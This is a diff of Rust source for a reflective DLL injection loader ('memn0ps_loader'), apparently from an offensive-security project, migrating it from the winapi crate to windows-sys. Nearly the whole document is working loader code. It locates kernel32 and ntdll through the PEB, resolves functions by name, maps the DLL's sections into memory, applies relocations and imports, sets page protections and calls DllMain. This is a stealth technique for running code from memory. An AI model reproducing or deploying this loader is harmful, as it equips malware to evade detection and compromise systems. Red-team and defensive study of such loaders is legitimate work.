@@ -1,53 +1,47 @@
-use std::{arch::asm, mem::size_of};
-
-use winapi::{um::{winnt::{PIMAGE_DOS_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, PIMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, MEM_RESERVE, MEM_COMMIT, DLL_PROCESS_ATTACH, IMAGE_REL_BASED_HIGHLOW, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, IMAGE_SCN_MEM_WRITE, PAGE_WRITECOPY, PAGE_READONLY, PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY, PAGE_EXECUTE_READ, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_EXECUTE}}, shared::{minwindef::{HMODULE, FARPROC, LPVOID, DWORD, HINSTANCE, BOOL, PDWORD}, ntdef::{LPCSTR, HANDLE, PVOID, NTSTATUS}, basetsd::SIZE_T}, ctypes::c_void};
-use ntapi::{ntpebteb::PTEB, ntldr::{PLDR_DATA_TABLE_ENTRY}, ntpsapi::PEB_LDR_DATA};
-
-#[cfg(target_arch = "x86")]
-use winapi::{um::winnt::{PIMAGE_NT_HEADERS32, PIMAGE_THUNK_DATA32, IMAGE_SNAP_BY_ORDINAL32, IMAGE_ORDINAL32}};
-
-#[cfg(target_arch = "x86_64")]
-use winapi::{um::winnt::{PIMAGE_NT_HEADERS64, PIMAGE_THUNK_DATA64, IMAGE_SNAP_BY_ORDINAL64, IMAGE_ORDINAL64}};
-
+use std::{arch::asm, mem::size_of, ffi::c_void};
+use ntapi::{ntpebteb::PTEB, ntpsapi::PEB_LDR_DATA, ntldr::LDR_DATA_TABLE_ENTRY};
+use num_traits::Num;
+use windows_sys::{Win32::{Foundation::{HANDLE, HINSTANCE, FARPROC, BOOL}, System::{Memory::{VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS, PAGE_WRITECOPY, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MEM_COMMIT}, SystemServices::{IMAGE_DOS_HEADER, DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG64, IMAGE_IMPORT_BY_NAME, IMAGE_EXPORT_DIRECTORY}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_SCN_MEM_WRITE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_EXECUTE, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_EXPORT}, WindowsProgramming::IMAGE_THUNK_DATA64}}, core::PCSTR};
 
 #[allow(non_camel_case_types)]
-type fnLoadLibraryA = unsafe extern "system" fn(lpFileName: LPCSTR) -> HMODULE;
+type fnLoadLibraryA = unsafe extern "system" fn(
+    lplibfilename: PCSTR
+) -> HINSTANCE;
 
 #[allow(non_camel_case_types)]
 type fnGetProcAddress = unsafe extern "system" fn(
-    hModule: HMODULE, 
-    lpProcName: LPCSTR
+    hmodule: HINSTANCE, 
+    lpprocname: PCSTR
 ) -> FARPROC;
 
 #[allow(non_camel_case_types)]
-type fnNtFlushInstructionCache = unsafe extern "system" fn(
-    ProcessHandle: HANDLE, 
-    BaseAddress: PVOID, 
-    Length: SIZE_T
-) -> NTSTATUS;
-
+type fnFlushInstructionCache = unsafe extern "system" fn(
+    hprocess: HANDLE, 
+    lpbaseaddress: *const c_void, 
+    dwsize: usize
+) -> BOOL;
 
 #[allow(non_camel_case_types)]
 type fnVirtualAlloc = unsafe extern "system" fn(
-    lpAddress: LPVOID, 
-    dwSize: SIZE_T, 
-    flAllocationType: DWORD, 
-    flProtect: DWORD
-) -> LPVOID;
+    lpaddress: *const c_void, 
+    dwsize: usize, 
+    flallocationtype: VIRTUAL_ALLOCATION_TYPE, 
+    flprotect: PAGE_PROTECTION_FLAGS
+) -> *mut c_void;
 
 #[allow(non_camel_case_types)]
 type fnVirtualProtect = unsafe extern "system" fn(
-    lpAddress: LPVOID, 
-    dwSize: SIZE_T, 
-    flNewProtect: DWORD, 
-    lpflOldProtect: PDWORD
+    lpaddress: *const c_void, 
+    dwsize: usize, 
+    flnewprotect: PAGE_PROTECTION_FLAGS, 
+    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
 ) -> BOOL;
 
 #[allow(non_camel_case_types)]
 type fnDllMain = unsafe extern "system" fn(
     module: HINSTANCE,
-    call_reason: DWORD,
-    reserved: LPVOID,
+    call_reason: u32,
+    reserved: *mut c_void,
 ) -> BOOL;
 
 // Function pointers (Thanks B3NNY)
@@ -55,7 +49,7 @@ static mut LOAD_LIBRARY_A: Option<fnLoadLibraryA> = None;
 static mut GET_PROC_ADDRESS: Option<fnGetProcAddress> = None;
 static mut VIRTUAL_ALLOC: Option<fnVirtualAlloc> = None;
 static mut VIRTUAL_PROTECT: Option<fnVirtualProtect> = None;
-static mut NT_FLUSH_INSTRUCTION_CACHE: Option<fnNtFlushInstructionCache> = None;
+static mut FLUSH_INSTRUCTION_CACHE: Option<fnFlushInstructionCache> = None;
 
 /// Performs a Reflective DLL Injection
 #[no_mangle]
@@ -67,13 +61,13 @@ pub extern "system" fn memn0ps_loader(dll_bytes: *mut c_void) {
         return;
     }
 
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
     //log::info!("[+] IMAGE_DOS_HEADER: {:?}", dos_header);
 
     #[cfg(target_arch = "x86")]
-    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32 };
+    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32 };
     #[cfg(target_arch = "x86_64")]
-    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64 };
+    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };
     //log::info!("[+] IMAGE_NT_HEADERS: {:?}", nt_headers);
 
     // 1) Load required modules and exports by name: LOAD_LIBRARY_A, GET_PROC_ADDRESS, VIRTUAL_ALLOC, VIRTUAL_PROTECT, NT_FLUSH_INSTRUCTION_CACHE
@@ -91,9 +85,6 @@ pub extern "system" fn memn0ps_loader(dll_bytes: *mut c_void) {
         return;
     }
 
-    //unsafe { copy_headers(module_base as _, new_module_base) };
-
-
     // 3) Process images relocations
 
     //log::info!("[+] Rebasing Image");
@@ -106,7 +97,7 @@ pub extern "system" fn memn0ps_loader(dll_bytes: *mut c_void) {
 
     // 5) Set protection for each section
     let section_header = unsafe { 
-        (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as PIMAGE_SECTION_HEADER 
+        (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *mut IMAGE_SECTION_HEADER 
     };
 
     for i in unsafe { 0..(*nt_headers).FileHeader.NumberOfSections } {
@@ -160,7 +151,7 @@ pub extern "system" fn memn0ps_loader(dll_bytes: *mut c_void) {
     //log::info!("[+] New Module Base {:?} + AddressOfEntryPoint {:#x} = {:#x}", new_module_base, unsafe { (*nt_headers).OptionalHeader.AddressOfEntryPoint }, entry_point);
 
     // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
-    unsafe { NT_FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };
+    unsafe { FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };
 
     //log::info!("[+] Calling DllMain");
     
@@ -175,12 +166,12 @@ pub extern "system" fn memn0ps_loader(dll_bytes: *mut c_void) {
 #[no_mangle]
 unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
 
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
     #[cfg(target_arch = "x86")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
     #[cfg(target_arch = "x86_64")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     // Calculate the difference between remote allocated memory region where the image will be loaded and preferred ImageBase (delta)
     let delta = new_module_base as isize - (*nt_headers).OptionalHeader.ImageBase as isize;
@@ -191,21 +182,11 @@ unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
         return;
     }
 
-    // Calcuate the dos/nt headers of new_module_base
     // Resolve the imports of the newly allocated memory region 
-
-    /* 
-    let dos_header = new_module_base as PIMAGE_DOS_HEADER;
-
-    #[cfg(target_arch = "x86")]
-    let nt_headers = (new_module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
-    #[cfg(target_arch = "x86_64")]
-    let nt_headers = (new_module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
-    */
 
     // Get a pointer to the first _IMAGE_BASE_RELOCATION
     let mut base_relocation = (new_module_base as usize 
-        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize) as PIMAGE_BASE_RELOCATION;
+        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize) as *mut IMAGE_BASE_RELOCATION;
     
     //log::info!("[+] IMAGE_BASE_RELOCATION: {:?}", base_relocation);
 
@@ -222,7 +203,7 @@ unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
 
         for i in 0..count {
             // Get the Type and Offset from the Block Size field of the _IMAGE_BASE_RELOCATION block
-            let type_field = item.offset(i as isize).read() >> 12;
+            let type_field = (item.offset(i as isize).read() >> 12) as u32;
             let offset = item.offset(i as isize).read() & 0xFFF;
 
             //IMAGE_REL_BASED_DIR32 does not exist
@@ -234,22 +215,22 @@ unsafe fn rebase_image(module_base: *mut c_void, new_module_base: *mut c_void) {
         }
 
         // Get a pointer to the next _IMAGE_BASE_RELOCATION
-        base_relocation = (base_relocation as usize + (*base_relocation).SizeOfBlock as usize) as PIMAGE_BASE_RELOCATION;
+        base_relocation = (base_relocation as usize + (*base_relocation).SizeOfBlock as usize) as *mut IMAGE_BASE_RELOCATION;
     }
 }
 
 /// Resolve the image imports
 #[no_mangle]
 unsafe fn resolve_imports(module_base: *mut c_void, new_module_base: *mut c_void) {
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
     #[cfg(target_arch = "x86")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
     #[cfg(target_arch = "x86_64")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     // Get a pointer to the first _IMAGE_IMPORT_DESCRIPTOR
-    let mut import_directory = (new_module_base as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as PIMAGE_IMPORT_DESCRIPTOR;
+    let mut import_directory = (new_module_base as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as *mut IMAGE_IMPORT_DESCRIPTOR;
     
     //log::info!("[+] IMAGE_IMPORT_DESCRIPTOR {:?}", import_directory);
 
@@ -259,54 +240,51 @@ unsafe fn resolve_imports(module_base: *mut c_void, new_module_base: *mut c_void
         let dll_name = (new_module_base as usize + (*import_directory).Name as usize) as *const i8;
 
         // Load the DLL in the in the address space of the process by calling the function pointer LoadLibraryA
-        let dll_handle = LOAD_LIBRARY_A.unwrap()(dll_name);
+        let dll_handle = LOAD_LIBRARY_A.unwrap()(dll_name as _);
 
         // Get a pointer to the Original Thunk or First Thunk via OriginalFirstThunk or FirstThunk 
-        let mut original_thunk = if (new_module_base as usize + *(*import_directory).u.OriginalFirstThunk() as usize) != 0 {
+        let mut original_thunk = if (new_module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) != 0 {
             #[cfg(target_arch = "x86")]
-            let orig_thunk = (new_module_base as usize + *(*import_directory).u.OriginalFirstThunk() as usize) as PIMAGE_THUNK_DATA32;
+            let orig_thunk = (new_module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
             #[cfg(target_arch = "x86_64")]
-            let orig_thunk = (new_module_base as usize + *(*import_directory).u.OriginalFirstThunk() as usize) as PIMAGE_THUNK_DATA64;
+            let orig_thunk = (new_module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
 
             orig_thunk
         } else {
             #[cfg(target_arch = "x86")]
-            let thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as PIMAGE_THUNK_DATA32;
+            let thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
             #[cfg(target_arch = "x86_64")]
-            let thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as PIMAGE_THUNK_DATA64;
+            let thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
 
             thunk
         };
 
         #[cfg(target_arch = "x86")]
-        let mut thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as PIMAGE_THUNK_DATA32;
+        let mut thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
         #[cfg(target_arch = "x86_64")]
-        let mut thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as PIMAGE_THUNK_DATA64;
+        let mut thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
  
-        while *(*original_thunk).u1.Function() != 0 {
+        while (*original_thunk).u1.Function != 0 {
             // #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0) or #define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)
             #[cfg(target_arch = "x86")]
-            let snap_result = IMAGE_SNAP_BY_ORDINAL32(*(*original_thunk).u1.Ordinal());
+            let snap_result = ((*original_thunk).u1.Ordinal) & IMAGE_ORDINAL_FLAG32 != 0;
             #[cfg(target_arch = "x86_64")]
-            let snap_result = IMAGE_SNAP_BY_ORDINAL64(*(*original_thunk).u1.Ordinal());
+            let snap_result = ((*original_thunk).u1.Ordinal) & IMAGE_ORDINAL_FLAG64 != 0;
 
             if snap_result {
                 //#define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff) or #define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
-                #[cfg(target_arch = "x86")]
-                let fn_ordinal = IMAGE_ORDINAL32(*(*original_thunk).u1.Ordinal()) as _;
-                #[cfg(target_arch = "x86_64")]
-                let fn_ordinal = IMAGE_ORDINAL64(*(*original_thunk).u1.Ordinal()) as _;
+                let fn_ordinal = ((*original_thunk).u1.Ordinal & 0xffff) as *const u8;
 
                 // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in IMAGE_THUNK_DATA by calling function pointer GetProcAddress by ordinal
-                *(*thunk).u1.Function_mut() = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_ordinal) as _; 
+                (*thunk).u1.Function = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_ordinal).unwrap() as _; 
             } else {
                 // Get a pointer to _IMAGE_IMPORT_BY_NAME
-                let thunk_data = (new_module_base as usize + *(*original_thunk).u1.AddressOfData() as usize) as PIMAGE_IMPORT_BY_NAME;
+                let thunk_data = (new_module_base as usize + (*original_thunk).u1.AddressOfData as usize) as *mut IMAGE_IMPORT_BY_NAME;
 
                 // Get a pointer to the function name in the IMAGE_IMPORT_BY_NAME
                 let fn_name = (*thunk_data).Name.as_ptr();
                 // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in IMAGE_THUNK_DATA by calling function pointer GetProcAddress by name
-                *(*thunk).u1.Function_mut() = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_name) as _; // 
+                (*thunk).u1.Function = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_name).unwrap() as _; // 
             }
 
             // Increment and get a pointer to the next Thunk and Original Thunk
@@ -319,33 +297,16 @@ unsafe fn resolve_imports(module_base: *mut c_void, new_module_base: *mut c_void
     }
 }
 
-/* 
-/// Copy headers into the target memory location
-#[no_mangle]
-unsafe fn copy_headers(module_base: *const u8, new_module_base: *mut c_void) {
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
-
-    #[cfg(target_arch = "x86")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
-    #[cfg(target_arch = "x86_64")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
-
-    for i in 0..(*nt_headers).OptionalHeader.SizeOfHeaders {
-        new_module_base.cast::<u8>().add(i as usize).write(module_base.add(i as usize).read());
-    }
-
-}*/
-
 // Copy sections of the dll to a memory location
 #[no_mangle]
 unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void { //Vec<u8>
     
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
     #[cfg(target_arch = "x86")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
     #[cfg(target_arch = "x86_64")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
+    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     let image_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
     let preferred_image_base_rva = (*nt_headers).OptionalHeader.ImageBase as *mut c_void;
@@ -359,7 +320,7 @@ unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void { //
     }
 
     // get a pointer to the _IMAGE_SECTION_HEADER
-    let section_header = (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as PIMAGE_SECTION_HEADER;
+    let section_header = (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *mut IMAGE_SECTION_HEADER;
 
     //log::info!("[+] IMAGE_SECTION_HEADER {:?}", section_header);
 
@@ -469,11 +430,11 @@ pub fn set_exported_functions_by_name() -> bool {
     //log::info!("[+] VirtualProtect {:?}", virtualprotect_address);
 
     //ntdll
-    let ntflushinstructioncache_address = unsafe { get_module_exports(ntdll_base, nt_flush_instruction_cache_bytes.as_ptr()) };
-    unsafe { NT_FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnNtFlushInstructionCache>(ntflushinstructioncache_address)) };
-    //log::info!("[+] NtFlushInstructionCache {:?}", ntflushinstructioncache_address);
+    let flushinstructioncache_address = unsafe { get_module_exports(ntdll_base, nt_flush_instruction_cache_bytes.as_ptr()) };
+    unsafe { FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnFlushInstructionCache>(flushinstructioncache_address)) };
+    //log::info!("[+] FlushInstructionCache {:?}", flushinstructioncache_address);
 
-    if loadlibrarya_address == 0 || getprocaddress_address == 0 || virtualalloc_address == 0 || virtualprotect_address == 0 || ntflushinstructioncache_address == 0 {
+    if loadlibrarya_address == 0 || getprocaddress_address == 0 || virtualalloc_address == 0 || virtualprotect_address == 0 || flushinstructioncache_address == 0 {
         return false;
     }
 
@@ -486,7 +447,7 @@ pub unsafe fn get_loaded_modules_by_name(module_name: *const u16) -> *mut u8 {
     let peb_ptr_ldr_data = get_peb_ldr() as *mut PEB_LDR_DATA;
     //log::info!("[+] PEB_LDR_DATA {:?}", peb_ptr_ldr_data);
 	
-    let mut module_list = (*peb_ptr_ldr_data).InLoadOrderModuleList.Flink as PLDR_DATA_TABLE_ENTRY;
+    let mut module_list = (*peb_ptr_ldr_data).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;
 
     while !(*module_list).DllBase.is_null() {
 
@@ -496,14 +457,13 @@ pub unsafe fn get_loaded_modules_by_name(module_name: *const u16) -> *mut u8 {
             return (*module_list).DllBase as _;
 		}
 
-        module_list = (*module_list).InLoadOrderLinks.Flink as PLDR_DATA_TABLE_ENTRY;
+        module_list = (*module_list).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
 	}
 
     return std::ptr::null_mut();
 }
 
 //Thanks 2vg
-use num_traits::Num;
 pub fn compare_raw_str<T>(s: *const T, u: *const T) -> bool
 where
     T: Num,
@@ -531,19 +491,19 @@ where
 #[no_mangle]
 unsafe fn get_module_exports(module_base: *mut u8, module_name: *const i8) -> usize {
 
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
+    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
 
     #[cfg(target_arch = "x86")]
-    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
+    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
 
     #[cfg(target_arch = "x86_64")]
-    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
+    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
 
     let export_directory = (module_base as usize
         + (*nt_header).OptionalHeader.DataDirectory
             [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
             .VirtualAddress as usize)
-        as PIMAGE_EXPORT_DIRECTORY;
+        as *mut IMAGE_EXPORT_DIRECTORY;
 
     let names = core::slice::from_raw_parts(
         (module_base as usize + (*export_directory).AddressOfNames as usize)
